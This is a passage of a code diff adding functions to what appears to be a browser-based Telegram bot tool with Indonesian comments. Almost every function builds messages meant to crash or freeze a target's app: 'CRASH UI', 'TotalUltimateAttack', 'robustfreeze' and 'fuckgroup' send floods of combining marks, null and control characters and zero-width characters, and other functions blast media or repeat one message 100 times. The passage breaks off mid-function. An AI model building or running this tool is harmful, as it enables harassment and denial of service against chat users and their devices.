+  const bodyText = "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝KILLU NI BOSSS".repeat(1000) + "ꦽ".repeat(1000);
+  const buttonsList = [
+    "single_select {status:true}",
+    "send_location {}",
+    "call_permission_request {status:true}",
+    "payment_method {}",
+    "form_message {}",
+    "catalog_message {}",
+    "review_and_pay {}"
+  ].join("\n");
+
+  const messageText =
+    `${headerText}\n\n${bodyText}\n\n` +
+    "🔘 Buttons:\n" + buttonsList +
+    `\n\nContact: @YaanzNotDev\nLink: https://t.me/YaanzNotDev`;
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: messageText
+      })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById("consoleOutput").textContent += `✅ CRASH UI terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal kirim CRASH UI :${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error CRASH UI: ${err.message}\n`;
+  }
+}
+
+async function FolwareFunction(target) {
+  // helpers lokal
+  const sleep = ms => new Promise(res => setTimeout(res, ms));
+  const splitChunks = (text, size) => {
+    const out = [];
+    for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size));
+    return out;
+  };
+  const log = msg => {
+    const el = document.getElementById("consoleOutput");
+    if (el) el.textContent += msg + "\n";
+    else console.log(msg);
+  };
+
+  async function sendTelegram(method, body, retries = 3) {
+    const url = `https://api.telegram.org/bot${botToken}/${method}`;
+    for (let attempt = 1; attempt <= retries; attempt++) {
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(body)
+        });
+        const data = await res.json();
+        if (data && data.ok) return data;
+        const errDesc = (data && data.description) || `HTTP ${res.status}`;
+        if (attempt < retries) await sleep(200 * attempt);
+        else throw new Error(errDesc);
+      } catch (err) {
+        if (attempt < retries) await sleep(200 * attempt);
+        else throw err;
+      }
+    }
+  }
+
+  // validasi dasar
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+  if (!target || typeof target !== "string") {
+    alert("Target tidak valid. Isi chat id atau @username.");
+    return;
+  }
+
+  try {
+    // PART 1 — "list-like" header (imitasi sections dari WA)
+    const bigTitle = "᭡꧈".repeat(250) + "ꦽ".repeat(250) + "\u0003".repeat(250);
+    // buat inline keyboard beberapa baris (aman)
+    const keyboard = Array.from({ length: 8 }, (_, i) => [{ text: `Item ${i + 1}`, callback_data: `fol_row_${i + 1}` }]);
+    await sendTelegram("sendMessage", {
+      chat_id: target,
+      text: `\u0003\n${bigTitle.slice(0, 1500)}`,
+      reply_markup: { inline_keyboard: keyboard },
+      disable_web_page_preview: true
+    });
+    log(`✅ Part 1 (list-like) terkirim ke ${target}`);
+    await sleep(180);
+
+    // PART 2 — kirim lokasi (imitasi sendLocation)
+    try {
+      await sendTelegram("sendLocation", { chat_id: target, latitude: 0.0001, longitude: 0.0001 });
+      log(`📍 Lokasi terkirim ke ${target}`);
+    } catch (err) {
+      log(`⚠ Gagal kirim lokasi (lanjutkan): ${err.message}`);
+    }
+    await sleep(160);
+
+    // PART 3 — kirim dokumen (imitasi document payload)
+    try {
+      await sendTelegram("sendDocument", {
+        chat_id: target,
+        document: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf",
+        caption: "Payment Invite\n" + "ꦾ".repeat(200)
+      });
+      log(`📄 Dokumen terkirim ke ${target}`);
+    } catch (err) {
+      log(`⚠ Gagal kirim dokumen (lanjutkan): ${err.message}`);
+    }
+    await sleep(220);
+
+    // PART 4 — extended text + URL preview (chunking agar tidak melebihi limit)
+    const title = "\u200D".repeat(80);
+    const description = "\u0003".repeat(800);
+    const previewLink = "https://example.com/" + "ꦾ".repeat(30); // memicu preview yang aman
+    const extBody = "\u0003".repeat(2000) + "\n\n" + "Payment Invite: USD 999,999\nExpiry: 9999999999";
+    const fullText = `${title}\n${description}\n${previewLink}\n\n${extBody}`;
+    const chunks = splitChunks(fullText, 3800); // aman untuk Telegram
+
+    for (let i = 0; i < chunks.length; i++) {
+      const hasUrl = i === 0; // tampilkan link preview hanya di chunk pertama
+      try {
+        await sendTelegram("sendMessage", {
+          chat_id: target,
+          text: chunks[i],
+          disable_web_page_preview: !hasUrl
+        });
+        log(`✉️ Part ${i + 1}/${chunks.length} terkirim`);
+      } catch (err) {
+        log(`⚠ Gagal kirim part ${i + 1}: ${err.message}`);
+        // lanjutkan bagian lain meskipun satu part gagal
+      }
+      await sleep(200);
+    }
+
+    // PART 5 — "notif" singkat (imitasi group status mention, non-destructive)
+    try {
+      await sendTelegram("sendMessage", {
+        chat_id: target,
+        text: "⃔ Tempek Function 🎵‌ — demo aman.",
+        disable_web_page_preview: true
+      });
+      log(`🔔 Notifikasi demo terkirim ke ${target}`);
+    } catch (err) {
+      log(`⚠ Gagal kirim notifikasi demo: ${err.message}`);
+    }
+
+    log(`✅ CRASH UI SEND BUG ${target}`);
+    return true;
+  } catch (err) {
+    log(`⛔ CRASH UI gagal: ${err.message}`);
+    return false;
+  }
+}
+
+/* Fungsi untuk membuat pesan crash IOS */
+async function TotalUltimateAttack(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const log = msg => {
+    const el = document.getElementById("consoleOutput");
+    if (el) el.textContent += msg + "\n";
+  };
+
+  const texts = [
+    "𑜦".repeat(3000),
+    "\u0000".repeat(3000),
+    "᬴".repeat(3000),
+    "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ".repeat(2000),
+    "聽".repeat(3000),
+    "\u0007\u200E\u2060\u200B".repeat(2000),
+    "\u200C".repeat(3000)
+  ];
+
+  const chunkSize = 3500;
+  let partNum = 1;
+
+  for (const text of texts) {
+    log(`🔹 Mengirim part ${partNum}/${texts.length}`);
+
+    const promises = [];
+
+    for (let start = 0; start < text.length; start += chunkSize) {
+      let chunk = text.slice(start, start + chunkSize);
+
+      // ✅ Tambahkan karakter terlihat agar tidak dianggap kosong
+      chunk = "⚡" + chunk + "⚡";
+
+      promises.push(
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: target, text: chunk })
+        })
+          .then(res => res.json())
+          .then(data => {
+            if (data.ok) {
+              log(`✅ Part ${partNum} (chunk ${Math.floor(start / chunkSize) + 1}) terkirim`);
+            } else {
+              log(`❌ Part ${partNum} gagal: ${data.description}`);
+            }
+          })
+          .catch(err => {
+            log(`⚠ Error part ${partNum}: ${err.message}`);
+          })
+      );
+    }
+
+    await Promise.all(promises);
+    partNum++;
+  }
+
+  log("✅ Semua teks TotalUltimateAttack terkirim");
+}
+
+async function OtaSpamNotif(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambahkan token terlebih dahulu.");
+    return;
+  }
+
+  const log = msg => {
+    const el = document.getElementById("consoleOutput");
+    if (el) el.textContent += msg + "\n";
+  };
+
+  // Isi teks "bug" biar panjang (tapi aman buat Telegram)
+  const text = "ꦽ".repeat(2000) + "_*~@8~*_\n".repeat(2000) + "@8".repeat(2000);
+
+  // Pecah biar tidak error "text must be non-empty"
+  const chunkSize = 3500;
+  let part = 1;
+
+  for (let start = 0; start < text.length; start += chunkSize) {
+    const chunk = "‎" + text.slice(start, start + chunkSize) + "‎"; // padding invisible
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: chunk
+        })
+      });
+
+      const data = await res.json();
+      if (data.ok) {
+        log(`✅ Part ${part} terkirim`);
+      } else {
+        log(`❌ Part ${part} gagal: ${data.description}`);
+      }
+    } catch (e) {
+      log(`⚠ Error Part ${part}: ${e.message}`);
+    }
+    part++;
+  }
+
+  log("✅ Semua teks OtaSpamNotif terkirim");
+}
+
+
+async function fuckgroup(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambahkan token terlebih dahulu.");
+    return;
+  }
+
+  const log = msg => {
+    const el = document.getElementById("consoleOutput");
+    if (el) el.textContent += msg + "\n";
+  };
+
+  const text = "ꦾ".repeat(2000) + "\n" + JSON.stringify({ status: true, criador: "OtaxAyun" });
+
+  const chunkSize = 3500;
+  let part = 1;
+
+  for (let start = 0; start < text.length; start += chunkSize) {
+    const chunk = "‎" + text.slice(start, start + chunkSize) + "‎"; 
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: chunk
+        })
+      });
+
+      const data = await res.json();
+      if (data.ok) {
+        log(`✅ Part ${part} terkirim`);
+      } else {
+        log(`❌ Part ${part} gagal: ${data.description}`);
+      }
+    } catch (e) {
+      log(`⚠ Error Part ${part}: ${e.message}`);
+    }
+    part++;
+  }
+
+  log("✅ Semua teks fuckgroup terkirim");
+}
+
+async function DelayWithUi(target, mention = false) {
+  if (!botToken) {
+    alert("Token bot belum diatur!");
+    return;
+  }
+
+  const UICrash = "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝AYAM BETUTU".repeat(3000); // max aman
+  const crashMsg = `${UICrash}\n⛧ ʜᴏʟᴀᴀᴀᴀᴀ ⛧`;
+
+  // 1. Kirim pesan teks crash
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: target,
+      text: crashMsg
+    })
+  });
+
+  // 2. Kirim video (ganti URL dengan video asli/public)
+  await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: target,
+      video: "https://files.catbox.moe/89t0ah.mp4", // contoh video, harus bisa diakses Telegram
+      caption: "⛧ ʟᴏʜ ᴋᴏᴋ ᴋɪʟʟᴇʀᴛ ⛧"
+    })
+  });
+
+  // 3. Kirim foto thumbnail + spam text
+  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: target,
+      photo: "https://files.catbox.moe/89t0ah.jpg",
+      caption: "⛧ ᴜᴅʜ ʏᴇᴇᴇᴇ ⛧\n" + "𑜦".repeat(1000)
+    })
+  });
+
+  // 4. Mention user kalau flag mention = true
+  if (mention) {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: `⚡ Kamu kena DelayWithUi, <a href="tg://user?id=${target}">mention</a>`,
+        parse_mode: "HTML"
+      })
+    });
+  }
+
+  document.getElementById("consoleOutput").textContent += 
+    `✅ DelayWithUi terkirim ke ${target}\n`;
+}
+
+async function robustfreeze(target) {
+  try {
+    if (!botToken) {
+      alert("Token bot belum diatur!");
+      return;
+    }
+
+    // Buat teks panjang (dibatasi agar tidak error Bad Request)
+    const textFreeze = 
+      "👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌ Rann here\n" +
+      "ꦽ".repeat(3000) +  // jangan terlalu panjang, biar lolos limit
+      "@freeze".repeat(3000);
+
+    // 1. Kirim pesan teks
+    let res1 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: textFreeze
+      })
+    });
+    let data1 = await res1.json();
+    console.log("Teks terkirim:", data1);
+
+    // 2. Kirim lokasi palsu (biar mirip yg ada locationMessage)
+    let res2 = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        latitude: 0,
+        longitude: 0
+      })
+    });
+    let data2 = await res2.json();
+    console.log("Lokasi terkirim:", data2);
+
+    // 3. Mention user kalau perlu
+    let res3 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: `⚡ Kamu di-freeze <a href="tg://user?id=${target}">mention</a>`,
+        parse_mode: "HTML"
+      })
+    });
+    let data3 = await res3.json();
+    console.log("Mention terkirim:", data3);
+
+    console.log(`✅ robustfreeze terkirim ke ${target}`);
+  } catch (err) {
+    console.error("❌ Error robustfreeze:", err.message);
+  }
+}
+
+async function FloodsCarousel2(target) {
+  try {
+    if (!botToken) {
+      alert("Token bot belum diatur!");
+      return;
+    }
+
+    // Buat teks panjang tapi dibatasi biar tidak kena error
+    const longText = "𝓥𝓪𝓶𝓹𝓲𝓻𝓮 𝓘𝓼 𝓑𝓪𝓬𝓴\n" + "\u0003".repeat(3000);
+
+    // 1. Kirim gambar dengan caption panjang (mirip header + body)
+    let res1 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        photo: "https://files.catbox.moe/wek01l.jpg",
+        caption: longText
+      })
+    });
+    let data1 = await res1.json();
+    console.log("Header terkirim:", data1);
+
+    // 2. Simulasi carousel pakai InlineKeyboard (button)
+    const keyboard = {
+      inline_keyboard: [
+        [
+          { text: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎", callback_data: "row1" },
+          { text: "😶‍🌫️", callback_data: "row2" }
+        ],
+        [
+          { text: "©ᴠᴀᴍᴘɪʀᴇ", callback_data: "row3" },
+          { text: "😶‍🌫️", callback_data: "row4" }
+        ]
+      ]
+    };
+
+    let res2 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: "🔥 Vampire Carousel 🔥",
+        reply_markup: keyboard
+      })
+    });
+    let data2 = await res2.json();
+    console.log("Carousel terkirim:", data2);
+
+    console.log(`✅ FloodsCarousel2 terkirim ke ${target}`);
+  } catch (err) {
+    console.error("❌ Error FloodsCarousel2:", err.message);
+  }
+}
+
+async function mediaBlast(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const log = msg => {
+    const el = document.getElementById("groupConsoleOutput");
+    if (el) el.textContent += msg + "\n";
+  };
+
+  // Helper: potong teks panjang agar < 4096 char
+  function chunkText(text, size = 4000) {
+    const chunks = [];
+    for (let i = 0; i < text.length; i += size) {
+      chunks.push(text.slice(i, i + size));
+    }
+    return chunks;
+  }
+
+  try {
+    // 1. Kirim foto + caption (auto split jika panjang)
+    const caption = "📷 Foto dengan caption panjang:\n" + "ᬼ".repeat(10000);
+    const captionChunks = chunkText(caption);
+    let res1 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      body: JSON.stringify({
+        chat_id: target,
+        photo: "https://files.catbox.moe/si9eel.png", // contoh foto
+        caption: captionChunks[0] // hanya bagian pertama jadi caption
+      }),
+      headers: { "Content-Type": "application/json" }
+    });
+    let data1 = await res1.json();
+    if (data1.ok) log("✅ Foto terkirim");
+    else log(`❌ Foto gagal: ${data1.description}`);
+
+    // kalau caption masih ada sisa, kirim sebagai teks tambahan
+    for (let i = 1; i < captionChunks.length; i++) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        body: JSON.stringify({ chat_id: target, text: captionChunks[i] }),
+        headers: { "Content-Type": "application/json" }
+      });
+      log(`✅ Caption part ${i+1} terkirim`);
+    }
+
+    // 2. Kirim teks panjang
+    const bigText = "📝 Pesan panjang:\n" + "ꦾ".repeat(15000);
+    const textChunks = chunkText(bigText);
+    for (let i = 0; i < textChunks.length; i++) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        body: JSON.stringify({ chat_id: target, text: textChunks[i] }),
+        headers: { "Content-Type": "application/json" }
+      });
+      log(`✅ Text part ${i+1}/${textChunks.length} terkirim`);
+    }
+
+    // 3. Kirim dokumen
+    let res2 = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+      method: "POST",
+      body: JSON.stringify({
+        chat_id: target,
+        document: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf",
+        caption: "📄 Dokumen"
+      }),
+      headers: { "Content-Type": "application/json" }
+    });
+    let data2 = await res2.json();
+    if (data2.ok) log("✅ Dokumen terkirim");
+    else log(`❌ Dokumen gagal: ${data2.description}`);
+
+    // 4. Kirim video
+    let res3 = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+      method: "POST",
+      body: JSON.stringify({
+        chat_id: target,
+        video: "https://files.catbox.moe/d1f8bc.mp4",
+        caption: "🎥 Video"
+      }),
+      headers: { "Content-Type": "application/json" }
+    });
+    let data3 = await res3.json();
+    if (data3.ok) log("✅ Video terkirim");
+    else log(`❌ Video gagal: ${data3.description}`);
+
+    log("🎉 Semua mediaBlast selesai tanpa limit Telegram");
+  } catch (err) {
+    log(`⚠ Error mediaBlast: ${err.message}`);
+  }
+}
+
+async function mediaBlastWithButtons(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const log = (msg) => {
+    const el = document.getElementById("groupConsoleOutput");
+    if (el) el.textContent += msg + "\n";
+  };
+
+  // helper lokal: pecah teks <= 4000 char (aman di bawah 4096)
+  function chunkText(text, size = 3500) {
+    const out = [];
+    for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size));
+    return out;
+  }
+
+  // helper lokal: kirim aman + auto-handle 429 Too Many Requests
+  async function safeSend(method, body) {
+    const url = `https://api.telegram.org/bot${botToken}/${method}`;
+    while (true) {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+      const data = await res.json();
+      if (data.ok) return data;
+      const p = data.parameters || {};
+      if (data.error_code === 429 && typeof p.retry_after === "number") {
+        await new Promise(r => setTimeout(r, p.retry_after * 1000));
+        continue;
+      }
+      throw new Error(data.description || "Telegram API error");
+    }
+  }
+
+  try {
+    // 1) Foto + caption (caption displit, part pertama di caption, sisanya lewat sendMessage)
+    const caption = "📷 Foto dengan caption panjang\n" + "ᬼ".repeat(10000);
+    const capChunks = chunkText(caption);
+    await safeSend("sendPhoto", {
+      chat_id: target,
+      photo: "https://files.catbox.moe/si9eel.png",
+      caption: capChunks[0] || "",
+    });
+    log("✅ Foto terkirim");
+
+    for (let i = 1; i < capChunks.length; i++) {
+      await safeSend("sendMessage", { chat_id: target, text: capChunks[i] });
+      log(`✅ Caption part ${i + 1}/${capChunks.length} terkirim`);
+    }
+
+    // 2) Teks panjang (auto-split)
+    const bigText = "📝 Pesan gabungan sangat panjang\n" + "ꦾ".repeat(18000);
+    const textChunks = chunkText(bigText);
+    for (let i = 0; i < textChunks.length; i++) {
+      await safeSend("sendMessage", { chat_id: target, text: textChunks[i] });
+      log(`✅ Text part ${i + 1}/${textChunks.length} terkirim`);
+    }
+
+    // 3) Dokumen (URL file)
+    await safeSend("sendDocument", {
+      chat_id: target,
+      document: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf",
+      caption: "📄 Dokumen",
+    });
+    log("✅ Dokumen terkirim");
+
+    // 4) Video (URL file)
+    await safeSend("sendVideo", {
+      chat_id: target,
+      video: "https://files.catbox.moe/d1f8bc.mp4",
+      caption: "🎥 Video",
+    });
+    log("✅ Video terkirim");
+
+    // 5) Tombol “aneh” namun valid (inline keyboard)
+    const weirdKeyboard = {
+      inline_keyboard: [
+        [
+          { text: "🌀 ɢʟɪᴛᴄʜ", callback_data: "g1" },
+          { text: "🧪 ʟᴀʙ", callback_data: "g2" },
+          { text: "🧩 ᴘᴜᴢᴢʟᴇ", callback_data: "g3" },
+        ],
+        [
+          { text: "⛧ 𝖀𝖓𝖚𝖘𝖚𝖆𝖑", callback_data: "u1" },
+          { text: "彡 ᴀɴᴏᴍᴀʟʏ", callback_data: "u2" },
+          { text: "◬ ᴘᴀʀᴀᴅᴏx", callback_data: "u3" },
+        ],
+        [
+          { text: "☯ ζ", callback_data: "z1" },
+          { text: "∞ η", callback_data: "z2" },
+          { text: "⚑ ψ", callback_data: "z3" },
+        ],
+      ],
+    };
+
+    await safeSend("sendMessage", {
+      chat_id: target,
+      text: "🧷 Tombol unik siap diuji.\n(Pastikan bot punya hak kirim tombol.)",
+      reply_markup: weirdKeyboard,
+    });
+    log("✅ Tombol unik terkirim");
+
+    log("🎉 mediaBlastWithButtons selesai tanpa limit");
+  } catch (err) {
+    log(`❌ Error: ${err.message}`);
+  }
+}
+
+async function BagTeleSticker(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const stickerId = "CAACAgUAAxkBAAIa3GiSkLUG5KkUDD4FwqZYudBFshX0AAIYAwAC6mu4VQqSpe-Igg_zNgQ";
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendSticker`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        sticker: stickerId
+      })
+    });
+
+    const data = await res.json();
+    if (!data.ok) {
+      console.log(`❌ Gagal kirim stiker: ${data.description}`);
+    } else {
+      console.log("✅ Stiker terkirim");
+    }
+  } catch (err) {
+    console.log(`⚠ Error BagTeleSticker: ${err.message}`);
+  }
+}
+
+async function TestFankTele(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const msg =
+    "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝".repeat(10) +
+    "SUIKA THE KING";
+
+  for (let i = 0; i < 100; i++) {
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: msg,
+        }),
+      });
+
+      console.log(`✅ Pesan ke-${i + 1} terkirim`);
+    } catch (err) {
+      console.log(`❌ Error kirim pesan ke-${i + 1}: ${err.message}`);
+    }
+  }
+}
+
+async function MakLoeMention(target, mention) {
+  if (!botToken) {
+    alert("Token bot belum diatur.");
+    return;
+  }
+  if (!target) {
+    alert("Target tidak valid.");
+    return;
+  }
+
+  const SyaX = "https://files.catbox.moe/qhrfuz.jpg"; 
+  const messageText = "You Idiot's";
+  const caption = mention ? `${mention} ${messageText}` : messageText;
+
+  try {
+    // kirim foto dengan caption
+    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        photo: SyaX,
+        caption: caption
+      })
+    });
+    console.log("✅ Foto terkirim");
+  } catch (err) {
+    console.log("❌ Gagal kirim foto:", err.message);
+  }
+
+  try {
+    // kirim pesan panjang
